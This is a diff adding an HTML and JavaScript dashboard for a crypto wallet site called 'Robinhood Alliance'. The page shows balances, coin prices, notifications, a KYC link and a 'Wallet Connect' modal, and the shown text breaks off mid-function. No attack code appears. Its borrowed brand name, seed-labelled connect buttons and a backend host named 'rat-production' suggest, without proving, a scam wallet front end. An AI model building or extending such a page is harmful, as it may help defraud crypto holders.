@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#007bcf" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <title>Robinhood Alliance - Dashboard</title>
+    <meta name="title" content="Robinhood Alliance - Dashboard">
+    <meta name="description" content="Robinhood Alliance">
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon-512x512.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="assets/images/favicon-192x192.png">
+    <link rel="manifest" href="assets/images/site.webmanifest">
+    <link rel="icon" href="assets/images/favicon.ico">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Robinhood Alliance - Dashboard">
+
+    <meta itemprop="name" content="Robinhood Alliance - Dashboard">
+    <meta itemprop="description" content="Robinhood Alliance">
+    <meta itemprop="image" content="/assets/images/seo/68faba839a8751761262211.png">
+
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Robinhood Alliance">
+    <meta property="og:description" content="Robinhood Alliance">
+    <meta property="og:image" content="/assets/images/seo/68faba839a8751761262211.png">
+    <meta property="og:url" content="/dashboard.html">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style data-styles="">
+        ion-icon { visibility: hidden }
+        .hydrated { visibility: inherit }
+    </style>
+    <style>
+        :root {
+            --AppColor: #007bcf;
+            --oColor: rgba(0, 123, 207, 0.37);
+            --wbColor: #fff;
+            --d_Color: #00528a;
+            --siteUrl: "";
+        }
+    </style>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="/static/css/src/ionicons.min.css">
+    <link rel="stylesheet" href="/static/css/App_Global.css">
+    <link href="/static/offline-theme-default.css" rel="stylesheet">
+    <link href="/static/offline-language-english.css" rel="stylesheet">
+    <link href="/static/alertify.css" rel="stylesheet">
+    <link href="/static/default.css" rel="stylesheet">
+    <link href="/static/css/font-awesome.css" rel="stylesheet">
+    <link href="/panel/assets/css/toastr.min.css" rel="stylesheet" type="text/css">
+    <link href="/panel/assets/css/icons.min.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+
+    <script src="/static/js/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .appHeader {
+            background: inherit !important;
+            border: none !important;
+            display: flex !important;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 15px;
+        }
+        .appHeader .left, .appHeader .right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .appHeader .pageTitle {
+            flex: 1;
+            text-align: center;
+        }
+        .appHeader .pageTitle img {
+            height: 40px;
+        }
+        .headerButton {
+            color: #e6edf3;
+            text-decoration: none;
+            font-size: 1.5rem;
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+        }
+        .notif-badge {
+            position: absolute;
+            top: -5px;
+            right: -8px;
+            background: #da3633;
+            color: #fff;
+            border-radius: 50%;
+            padding: 2px 6px;
+            font-size: 10px;
+            font-weight: bold;
+            display: none;
+            min-width: 18px;
+            text-align: center;
+        }
+        .notif-dropdown {
+            display: none;
+            position: absolute;
+            right: 0;
+            top: 100%;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            min-width: 320px;
+            max-height: 400px;
+            overflow-y: auto;
+            z-index: 1000;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+        .notif-dropdown .notif-item {
+            padding: 10px 15px;
+            border-bottom: 1px solid #21262d;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        .notif-dropdown .notif-item:hover {
+            background: #21262d;
+        }
+        .notif-dropdown .notif-item .notif-dot {
+            width: 8px;
+            height: 8px;
+            background: #da3633;
+            border-radius: 50%;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+        .notif-dropdown .notif-item .notif-dot.read {
+            background: transparent;
+        }
+        .notif-dropdown .notif-item .notif-content {
+            flex: 1;
+        }
+        .notif-dropdown .notif-item .notif-title {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .notif-dropdown .notif-item .notif-preview {
+            font-size: 0.8rem;
+            color: #8b949e;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .notif-dropdown .notif-item .notif-time {
+            font-size: 0.7rem;
+            color: #8b949e;
+            margin-left: 8px;
+            white-space: nowrap;
+        }
+        .notif-dropdown .notif-empty {
+            padding: 20px;
+            text-align: center;
+            color: #8b949e;
+        }
+        .notif-dropdown.show {
+            display: block;
+        }
+        .modal-content {
+            background: #161b22;
+            color: #e6edf3;
+        }
+        .modal-header, .modal-footer {
+            border-color: #30363d;
+        }
+        .btn-close {
+            filter: invert(1);
+        }
+        #appCapsule {
+            margin-top: 18px;
+            margin-bottom: 18px;
+        }
+        .stat-box .value.bt {
+            font-size: 12px !important;
+        }
+        .ico1 {
+            display: flex !important;
+        }
+        .wallet-footer .item .icon-wrapper {
+            font-size: 1.2rem;
+        }
+        .transactions .item {
+            background: transparent !important;
+            padding: 12px 6px !important;
+            box-shadow: none;
+            margin-bottom: 0;
+        }
+        .imaged.w48 {
+            width: 40px !important;
+        }
+        .cAmt {
+            max-width: 5rem;
+            overflow: hidden;
+            vertical-align: bottom;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+        [data-price-flags] {
+            display: inline-block;
+            margin-left: 0.2rem;
+            color: #1dcc70;
+        }
+        [data-price-flags*="-"] {
+            color: #ff396f;
+        }
+        .popTp {
+            border-radius: 0.5rem;
+            padding: 0.4rem 0.7rem;
+        }
+        .bottom-sheet .modal-dialog {
+            position: fixed;
+            bottom: 0;
+            margin: 0;
+            width: 100%;
+            max-width: 500px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100%);
+            transition: transform 0.3s ease-out;
+        }
+        .bottom-sheet.show .modal-dialog {
+            transform: translateX(-50%) translateY(0);
+        }
+        .bottom-sheet .modal-content {
+            border-radius: 16px 16px 0 0;
+            background-color: #eaf2f6;
+            box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.1);
+            border: none;
+        }
+        .btn-border-purple {
+            border: 2px solid #87b8d1;
+            background-color: #fff;
+            color: #072840;
+            border-radius: 20px;
+            font-weight: 600;
+            padding: 0.5rem 1.5rem;
+            transition: all 0.2s ease;
+        }
+        .btn-border-purple:hover {
+            background-color: #02050a;
+            color: #fff;
+        }
+    </style>
+    
+</head>
+
+<body>
+
+    <!-- ===================== HEADER ===================== -->
+    <div class="appHeader text-light ico1">
+        <div class="left">
+            <a href="/profile-setting.html" class="headerButton">
+                <ion-icon name="settings-outline" style="font-size:24px;"></ion-icon>
+            </a>
+        </div>
+
+        <div class="pageTitle">
+            <img src="/assets/images/logo_icon/logo.jpg" width="150" alt="">
+        </div>
+
+        <div class="right" style="position:relative;">
+            <a href="#" id="notificationBell" class="headerButton" style="position:relative;">
+                <ion-icon name="notifications-outline" style="font-size:24px;"></ion-icon>
+                <span id="notifBadge" class="notif-badge">0</span>
+            </a>
+            <div id="notifDropdown" class="notif-dropdown">
+                <div id="notifList"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===================== MAIN CONTENT ===================== -->
+    <div id="appCapsule" class="container">
+
+        <!-- Wallet Card -->
+        <div class="section wallet-card-section pt-1">
+            <div class="wallet-card">
+                <div style="font-size: 11px;">
+                    WALLET ID: <strong><span id="db-wallet-id" class="copytxt">FETCHING...</span></strong>
+                    <button class="btn" id="Btn_copy" style="color: #929292; padding: 0; margin: 0; outline: none; border: none;">
+                        <ion-icon name="copy-outline" style="font-size: inherit;" role="img" class="md hydrated" aria-label="copy outline"></ion-icon>
+                    </button>
+                </div>
+
+                <div class="balance">
+                    <div class="left">
+                        <span class="title">Account Balance</span>
+                        <h4 class="total"><span id="db-main-balance">$0.00</span></h4>
+                    </div>
+                    <div class="right">
+                        <div class="card">
+                            <div class="card-header" style="margin-top:5px; padding:5px 20px">
+                                <h6 class="card-title" style="margin-bottom:0px">Account Status</h6>
+                            </div>
+                            <div class="card-body" id="db-status-container" style="margin-bottom:5px; padding:5px 20px">
+                                <p class="text-danger" style="margin-bottom:0;">Loading...</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="wallet-footer">
+                    <div class="item">
+                        <a href="javascript:void(0);" data-bs-toggle="modal" data-bs-target="#depositActionSheet" data-cat-pop="send">
+                            <div class="icon-wrapper">
+                                <ion-icon name="arrow-up-outline" role="img" class="md hydrated" aria-label="arrow up outline"></ion-icon>
+                            </div>
+                            <strong>Send</strong>
+                        </a>
+                    </div>
+                    <div class="item">
+                        <a href="javascript:void(0);" data-bs-toggle="modal" data-bs-target="#depositActionSheet" data-cat-pop="receive">
+                            <div class="icon-wrapper">
+                                <ion-icon name="arrow-down-outline" role="img" class="md hydrated" aria-label="arrow down outline"></ion-icon>
+                            </div>
+                            <strong>Receive</strong>
+                        </a>
+                    </div>
+                    <div class="item">
+                        <a href="/kyc-form.html">
+                            <div class="icon-wrapper">
+                                <ion-icon name="person-outline" role="img" class="md hydrated" aria-label="person outline"></ion-icon>
+                            </div>
+                            <strong>KYC</strong>
+                        </a>
+                    </div>
+                    <div class="item hp-select-box-item" style="cursor: pointer;">
+                        <div class="icon-wrapper">
+                            <img src="assets/images/ra.jpg" class="d-none">
+                            <ion-icon name="link-outline" role="img" class="md hydrated" aria-label="link outline"></ion-icon>
+                        </div>
+                        <strong class="coin-name">Wallet Connect</strong>
+                    </div>
+                </div>
+
+                <div class="row mt-2">
+                    <div class="col-6">
+                        <div class="stat-box">
+                            <div class="title">Income</div>
+                            <div class="value text-success text-wrap">
+                                <span id="db-income">$0.00</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6">
+                        <div class="stat-box">
+                            <div class="title">Expenses</div>
+                            <div class="value text-danger text-wrap">
+                                <span id="db-expenses">$0.00</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Assets -->
+        <div class="section mb-3 mt-4">
+            <div class="section-heading">
+                <h2 class="title"><b>ASSETS</b></h2>
+            </div>
+            <div class="transactions fCDL--7">
+                <!-- BTC -->
+                <a href="/coin/bitcoin.html" class="item card-coin tpCoins_x" data-cname="Bitcoin" data-coinid="bitcoin">
+                    <div class="detail">
+                        <img src="/assets/images/coin/77655.svg" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>Bitcoin</strong>
+                            <p>
+                                <span id="btc_price" class="fs-12 mb-0 text-muted" style="color:#f7931A;">--</span>
+                                <small> <span id="btc_change" class="text-success fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-btc-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-btc-amt">0</label>&nbsp;BTC</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- ETH -->
+                <a href="/coin/ethereum.html" class="item card-coin tpCoins_x" data-cname="Ethereum" data-coinid="ethereum">
+                    <div class="detail">
+                        <img src="/assets/images/coin/29869.svg" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>Ethereum</strong>
+                            <p>
+                                <span id="eth_price" class="fs-12 mb-0 text-muted" style="color:#3C3C3D;">--</span>
+                                <small> <span id="eth_change" class="text-danger fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-eth-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-eth-amt">0</label>&nbsp;ETH</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- USDT -->
+                <a href="/coin/usdt.html" class="item card-coin tpCoins_x" data-cname="USDT" data-coinid="tether">
+                    <div class="detail">
+                        <img src="/assets/images/coin/38081.svg" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>USDT (ERC 20)</strong>
+                            <p>
+                                <span class="fs-12 mb-0 text-muted" style="color:#22a079;">$1.00</span>
+                                <small> <span class="text-secondary fs-12 mb-0">0%</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-usdt-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-usdt-amt">0</label>&nbsp;USDT</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- TRON -->
+                <a href="/coin/tron.html" class="item card-coin tpCoins_x" data-cname="TRON" data-coinid="tron">
+                    <div class="detail">
+                        <img src="/assets/images/coin/34272.svg" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>TRON</strong>
+                            <p>
+                                <span id="trx_price" class="fs-12 mb-0 text-muted" style="color:#eb0029;">--</span>
+                                <small> <span id="trx_change" class="text-success fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-tron-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-tron-amt">0</label>&nbsp;TRX</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- BNB -->
+                <a href="/coin/bnb.html" class="item card-coin tpCoins_x" data-cname="BNB" data-coinid="binancecoin">
+                    <div class="detail">
+                        <img src="/assets/images/coin/89776.png" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>BNB Smart Chain</strong>
+                            <p>
+                                <span id="bnb_price" class="fs-12 mb-0 text-muted" style="color:#e8b342;">--</span>
+                                <small> <span id="bnb_change" class="text-danger fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-bnb-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-bnb-amt">0</label>&nbsp;BNB</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- XRP -->
+                <a href="/coin/ripple.html" class="item card-coin tpCoins_x" data-cname="Ripple" data-coinid="ripple">
+                    <div class="detail">
+                        <img src="/assets/images/coin/52.png" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>Ripple</strong>
+                            <p>
+                                <span id="xrp_price" class="fs-12 mb-0 text-muted" style="color:#eb0029;">--</span>
+                                <small> <span id="xrp_change" class="text-success fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-xrp-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-xrp-amt">0</label>&nbsp;XRP</span>
+                        </div>
+                    </div>
+                </a>
+                <!-- XLM -->
+                <a href="/coin/stellar_lumens.html" class="item card-coin tpCoins_x" data-cname="Stellar" data-coinid="stellar">
+                    <div class="detail">
+                        <img src="/assets/images/coin/512.png" width="30" height="30" alt="">
+                        <div class="ms-2">
+                            <strong>Stellar Lumens</strong>
+                            <p>
+                                <span id="xlm_price" class="fs-12 mb-0 text-muted" style="color:#eb0029;">--</span>
+                                <small> <span id="xlm_change" class="text-success fs-12 mb-0">--</span></small>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="right text-end">
+                        <div class="price text-primary" id="db-xlm-usd">$0.00</div>
+                        <div class="price">
+                            <span><label id="db-xlm-amt">0</label>&nbsp;XLM</span>
+                        </div>
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        <!-- Deposit Action Sheet -->
+        <div class="modal fade action-sheet" id="depositActionSheet" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title">CRYPTO</h5>
+                    </div>
+                    <div class="modal-body">
+                        <div class="action-sheet-content" style="overflow-x: hidden;">
+                            <div class="form-group basic">
+                                <div class="transactions">
+                                    <a href="javascript:void(0);" data-href-tz="/bitcoin.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/77655.svg" width="25" height="25" alt=""><div class="ms-1"><strong>Bitcoin</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/ethereum.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/29869.svg" width="25" height="25" alt=""><div class="ms-1"><strong>Ethereum</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/usdt.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/38081.svg" width="25" height="25" alt=""><div class="ms-1"><strong>USDT (ERC 20)</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/tron.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/34272.svg" width="25" height="25" alt=""><div class="ms-1"><strong>TRON</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/bnb.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/89776.png" width="25" height="25" alt=""><div class="ms-1"><strong>BNB</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/ripple.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/52.png" width="25" height="25" alt=""><div class="ms-1"><strong>Ripple</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                    <a href="javascript:void(0);" data-href-tz="/stellar_lumens.html" class="item card-coin tpCoins_x">
+                                        <div class="detail"><img src="/assets/images/coin/512.png" width="25" height="25" alt=""><div class="ms-1"><strong>Stellar Lumens</strong></div></div>
+                                        <div class="right"></div>
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="form-group basic">
+                                <button type="button" class="btn btn-primary btn-block btn-lg" data-bs-dismiss="modal">Close</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script src="/static/clipboard.min.js"></script>
+        <script>
+            $(document).on("click", "[id*=Btn_copy]", function(e) {
+                e.preventDefault();
+                ClipboardJS.copy($(".copytxt").text());
+                if (typeof alertify !== 'undefined') alertify.success("Copied to clipboard");
+                return false;
+            });
+
+            $(document).on("click", "[data-cat-pop]", function() {
+                var s = $(this);
+                $("#depositActionSheet").attr("data-mvt", s.attr("data-cat-pop"));
+            });
+            $(document).on("click", "[data-href-tz]", function() {
+                var h = $("#depositActionSheet").attr("data-mvt");
+                if (h) {
+                    location.href = 'dashboard/' + h + $(this).attr("data-href-tz");
+                }
+            });
+        </script>
+
+    </div> <!-- /appCapsule -->
+
+    <!-- ===================== BOTTOM NAVIGATION ===================== -->
+    <div class="appBottomMenu">
+        <a href="/dashboard.html" class="item"><div class="col"><ion-icon name="home-outline"></ion-icon><strong>Home</strong></div></a>
+        <a href="/swap.html" class="item"><div class="col"><ion-icon name="reload-outline"></ion-icon><strong>Swap</strong></div></a>
+        <a href="/buy.html" class="item"><div class="col"><ion-icon name="cart-outline"></ion-icon><strong>Buy</strong></div></a>
+        <a href="/profile-setting.html" class="item"><div class="col"><ion-icon name="settings-outline"></ion-icon><strong>Settings</strong></div></a>
+    </div>
+
+    <!-- ===================== NOTIFICATION DETAIL MODAL ===================== -->
+    <div class="modal fade" id="notifModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="notifModalTitle">Notification</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <p id="notifModalMessage"></p>
+                    <small class="text-muted" id="notifModalTime"></small>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===================== WALLET CONNECT MODAL ===================== -->
+    <div class="modal fade bottom-sheet" id="walletModal" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <img id="walletModalImg" src="#" alt="" style="max-width:60px; margin-bottom:15px;" />
+                    <h4 id="walletModalName"></h4>
+                    <p>Your <span id="walletModalNameText"></span> wallet can be connected here.</p>
+                    <div class="row no-gutters">
+                        <div class="col-6 p-1"><button class="xrpl-wallet-connect btn btn-border-purple w-100 py-2 connect-step-btn" data-type="XRP" data-dismiss="modal">Connect XRP</button></div>
+                        <div class="col-6 p-1"><button class="seed-button btn btn-border-purple w-100 py-2 connect-step-btn" data-type="BTC" data-dismiss="modal">Connect BTC</button></div>
+                        <div class="col-6 p-1"><button class="btn btn-border-purple w-100 py-2 connect-step-btn" data-type="TRON" data-dismiss="modal">Connect TRON</button></div>
+                        <div class="col-6 p-1"><button class="evm-button btn btn-border-purple w-100 py-2 connect-step-btn" data-type="EVM" data-dismiss="modal">Connect EVM</button></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== SCRIPTS ==================== -->
+    <script src="/static/js/lib/bootstrap.bundle.min.js"></script>
+    <script src="/static/js/base.js"></script>
+    <script src="/static/alertify.min.js"></script>
+    <link href="/assets/global/css/iziToast.min.css" rel="stylesheet">
+    <script src="/assets/global/js/iziToast.min.js"></script>
+
+    <!-- Wallet Connect Handler -->
+    <script>
+        $(document).ready(function() {
+            $('.hp-select-box-item').on('click', function() {
+                var walletName = $(this).find('.coin-name').text().trim();
+                var walletImg = $(this).find('img').attr('src');
+                $('#walletModalName, #walletModalNameText').text(walletName);
+                $('#walletModalImg').attr('src', walletImg);
+                $('#walletModal').modal('show');
+            });
+            $('.connect-step-btn').on('click', function() {
+                $('#walletModal').modal('hide');
+            });
+        });
+    </script>
+
+    <!-- ========== DASHBOARD DATA + MULTI CURRENCY ========== -->
+    <script>
+        // ---- CURRENCY HELPERS ----
+        const CURRENCY_SYMBOLS = {
+            USD: '$', EUR: '€', GBP: '£', NGN: '₦', CAD: 'C$', AUD: 'A$',
+            JPY: '¥', CHF: 'CHF', CNY: '¥', INR: '₹', ZAR: 'R', GHS: 'GH₵',
+            KES: 'KSh', AED: 'د.إ', SAR: '﷼', BRL: 'R$', MXN: 'MX$',
+            TRY: '₺', RUB: '₽', SGD: 'S$'
+        };
+
+        const RATES = {
+            USD: 1, EUR: 0.92, GBP: 0.79, NGN: 1600, CAD: 1.36, AUD: 1.53,
+            JPY: 157, CHF: 0.89, CNY: 7.25, INR: 83.5, ZAR: 18.2, GHS: 15.5,
+            KES: 129, AED: 3.67, SAR: 3.75, BRL: 5.4, MXN: 18.2, TRY: 32.5,
+            RUB: 92, SGD: 1.35
+        };
+
+        function getPreferredCurrency() {
+            return localStorage.getItem('preferred_currency') || 'USD';
+        }
+
+        function formatCrypto(amount) {
+            if (amount === 0 || amount === null || amount === undefined) return '0';
+            const num = Number(amount);
+            if (isNaN(num)) return '0';
+            return parseFloat(num.toFixed(8)).toLocaleString(undefined, {
+                minimumFractionDigits: 0,
+                maximumFractionDigits: 8
+            });
+        }
+
+        // Converts a USD amount into the user's preferred currency
+        function formatMoney(usdAmount) {
+            const curr = getPreferredCurrency();
+            const rate = RATES[curr] || 1;
+            const symbol = CURRENCY_SYMBOLS[curr] || (curr + ' ');
+            const converted = (Number(usdAmount) * rate).toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+            return symbol + converted;
+        }
+
+        // ---- CONFIG ----
+        const API_BASE = 'https://rat-production-1899.up.railway.app';
+
+        let notifications = [];
+        window._walletMap = {};
+
+        // ---- AUTH ----
+        (function checkAuth() {
+            const token = localStorage.getItem('token');
+            if (!token) {
+                window.location.href = 'login.html';
+                return;
+            }
+            fetchUserData(token);
+        })();
+
+        async function fetchUserData(token) {
+            try {
+                const userRes = await fetch(`${API_BASE}/api/user`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!userRes.ok) throw new Error('Session expired');
+                const user = await userRes.json();
+
+                // Sync preferred currency from backend
+                if (user.preferred_currency) {
+                    localStorage.setItem('preferred_currency', user.preferred_currency);
+                }
+
+                // Keep user object updated
+                localStorage.setItem('user', JSON.stringify({
+                    id: user.id,
+                    fullName: user.full_name || user.fullName,
+                    email: user.email,
+                    role: user.role
+                }));
+
+                const walletRes = await fetch(`${API_BASE}/api/wallets`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!walletRes.ok) throw new Error('Failed to fetch wallets');
+                const wallets = await walletRes.json();
+
+                const walletMap = {};
+                wallets.forEach(w => {
+                    walletMap[w.currency.toLowerCase()] = Number(w.balance);
+                });
+                window._walletMap = walletMap;
+
+                updateDashboardUI(user, walletMap);
+                await fetchPricesAndCompute(walletMap);
+                await loadNotifications();
+
+                // Auto-refresh every 60s
+                setInterval(() => {
+                    const tk = localStorage.getItem('token');
+                    if (tk) {
+                        fetchPricesAndCompute(window._walletMap);
+                        loadNotifications();
+                    }
+                }, 60000);
+
+            } catch (err) {
+                console.error('Auth error:', err);
+                localStorage.removeItem('token');
+                localStorage.removeItem('user');
+                window.location.href = 'login.html';
+            }
+        }
+
+        function updateDashboardUI(user, walletMap) {
+            const walletIdEl = document.getElementById('db-wallet-id');
+            if (walletIdEl) {
+                walletIdEl.innerText = user.id.toString().padStart(8, '0').toUpperCase();
+            }
+
+            // Income / Expenses (treated as USD equivalents → converted)
+            document.getElementById('db-income').innerText = formatMoney(user.income || 0);
+            document.getElementById('db-expenses').innerText = formatMoney(user.expenses || 0);
+
+            // Crypto amounts
+            const coinIds = ['btc', 'eth', 'usdt', 'tron', 'bnb', 'xrp', 'xlm'];
+            coinIds.forEach(id => {
+                const el = document.getElementById(`db-${id}-amt`);
+                if (el) {
+                    el.innerText = formatCrypto(walletMap[id] || 0);
+                }
+            });
+
+            // Account status
+            const statusContainer = document.getElementById('db-status-container');
+            if (statusContainer) {
+                if (user.is_verified) {
+                    statusContainer.innerHTML = `<p class="text-success" style="margin-bottom:0;">Verified <img src="/assets/images/verified.png" width="12" height="12"></p>`;
+                } else {
+                    statusContainer.innerHTML = `<p class="text-danger" style="margin-bottom:0;">Unverified <img src="/assets/images/unverified.png" width="12" height="12"></p>`;
+                }
+            }
+        }
+
+        async function fetchPricesAndCompute(walletMap) {
+            try {
+                const res = await fetch(
+                    'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tron,binancecoin,ripple,stellar&vs_currencies=usd&include_24hr_change=true'
+                );
+                if (!res.ok) throw new Error('Price API error');
+                const prices = await res.json();
+
+                // Market tickers stay in USD (standard)
+                updateTicker('btc', prices.bitcoin);
+                updateTicker('eth', prices.ethereum);
+                updateTicker('trx', prices.tron);
+                updateTicker('bnb', prices.binancecoin);
+                updateTicker('xrp', prices.ripple);
+                updateTicker('xlm', prices.stellar);
+
+                let totalUSD = 0;
+
+                const coinMap = {
+                    btc: 'bitcoin',
+                    eth: 'ethereum',
+                    tron: 'tron',
+                    bnb: 'binancecoin',
+                    xrp: 'ripple',
+                    xlm: 'stellar'
+                };
+
+                Object.keys(coinMap).forEach(key => {
+                    const amount = Number(walletMap[key] || 0);
+                    const price = prices[coinMap[key]] ? prices[coinMap[key]].usd : 0;
+                    const valueUSD = amount * price;
+                    totalUSD += valueUSD;
+
+                    const el = document.getElementById(`db-${key}-usd`);
+                    if (el) el.innerText = formatMoney(valueUSD);
+                });
+
+                // USDT ≈ $1
+                const usdtAmt = Number(walletMap.usdt || 0);
+                totalUSD += usdtAmt;
+                const usdtEl = document.getElementById('db-usdt-usd');
+                if (usdtEl) usdtEl.innerText = formatMoney(usdtAmt);
+
+                // Main balance
+                const mainBal = document.getElementById('db-main-balance');
+                if (mainBal) mainBal.innerText = formatMoney(totalUSD);
+
+            } catch (err) {
+                console.error('Price fetch error:', err);
+            }
+        }
+
+        function updateTicker(prefix, coin) {
+            if (!coin) return;
+            const pEl = document.getElementById(`${prefix}_price`);
+            const cEl = document.getElementById(`${prefix}_change`);
+            if (pEl) {
+                pEl.innerText = '$' + coin.usd.toLocaleString(undefined, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+            }
+            if (cEl) {
+                const change = coin.usd_24h_change || 0;
+                const sign = change >= 0 ? '+' : '';
+                cEl.innerText = `${sign}${change.toFixed(2)}%`;
+                cEl.className = change >= 0 ? 'text-success fs-12 mb-0' : 'text-danger fs-12 mb-0';
+            }
+        }
+
+        // ---------- NOTIFICATIONS ----------
+        async function loadNotifications() {
+            try {
+                const token = localStorage.getItem('token');
+                const res = await fetch(`${API_BASE}/api/notifications`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                if (!res.ok) throw new Error('Failed to fetch notifications');
+                notifications = await res.json();
+                updateNotifBadge();
+                renderNotifications();
+            } catch (err) {
+                console.error('Notification error:', err);
+            }
+        }
+
+        function updateNotifBadge() {
+            const unread = notifications.filter(n => !n.is_read).length;
+            const badge = document.getElementById('notifBadge');
+            if (unread > 0) {
+                badge.style.display = 'inline';
+                badge.textContent = unread;
+            } else {
+                badge.style.display = 'none';
+            }
+        }
+
+        function renderNotifications() {
+            const list = document.getElementById('notifList');
+            if (!notifications || notifications.length === 0) {
+                list.innerHTML = '<div class="notif-empty">No notifications</div>';
+                return;
+            }
+            let html = '';
+            notifications.forEach(n => {
+                const isRead = n.is_read;
